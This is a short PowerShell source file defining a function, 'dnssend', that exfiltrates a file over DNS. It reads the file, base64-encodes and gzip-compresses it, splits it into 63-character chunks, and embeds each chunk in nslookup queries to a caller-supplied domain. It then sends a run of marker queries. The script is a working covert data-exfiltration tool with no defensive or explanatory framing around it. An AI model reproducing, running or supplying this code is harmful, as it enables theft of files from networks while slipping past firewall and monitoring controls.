Function dnssend([string]$Filename, [string]$domain, [int]$retryline)
{
if (!$Filename) { return "Usage: dnssend <filename> <domain>" }
if (!$domain) { return "Usage: dnssend <filename> <domain>" }
$epoch=[Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))

$bstring = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$Filename"))
$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$sw = New-Object System.IO.StreamWriter($cs)
$sw.Write($bstring)
$sw.Close();
$bstring = [System.Convert]::ToBase64String($ms.ToArray())

$linenum=0
$bstring -split '(.{63})' |? {$_;} | % { $linenum++ }
$linetotal=$linenum
$linenum=0
$bstring -split '(.{63})' |? {$_;} | % { $linenum++; if ((!$retryline) -or ($linenum -eq $retryline)) { $lookup="${_}.${epoch}.${linenum}.x.${domain}"; write-host "line ${linenum}/${linetotal}  $lookup" ; nslookup $lookup >$null 2>$null ; sleep 0.1 } }
for ($i=0; $i -lt 20; $i++) { $rand=get-random -maximum 99999 -minimum 0; $lookup="${rand}hacfhacf.x.${domain}"; write-host $lookup ; nslookup $lookup >$null 2>$null; sleep 0.6}
}

